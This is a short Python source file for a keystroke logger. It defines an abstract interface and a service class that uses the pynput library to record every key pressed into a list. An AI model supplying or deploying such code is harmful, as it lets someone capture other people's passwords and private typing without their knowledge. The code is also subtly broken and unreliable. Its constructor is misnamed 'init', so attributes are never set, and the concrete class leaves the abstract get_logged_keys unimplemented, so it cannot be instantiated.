from pynput import keyboard
from typing import List
from abc import ABC, abstractmethod

class IKeyLogger(ABC):
    @abstractmethod
    def start_logging(self) -> None:
        pass

    @abstractmethod
    def stop_logging(self) -> None:
        pass

    @abstractmethod
    def get_logged_keys(self) -> List[str]:
        pass

class KeyLoggerService(IKeyLogger):
    def init(self):
        self.logged_keys = []
        self.listener = None

    def _on_press(self, key):
        try:
            self.logged_keys.append(key.char)
        except AttributeError:
            self.logged_keys.append(str(key))

    def start_logging(self) -> None:
        if not self.listener:
            self.listener = keyboard.Listener(on_press=self._on_press)
            self.listener.start()

    def stop_logging(self) -> None:
        if self.listener:
            self.listener.stop()
            self.listener = None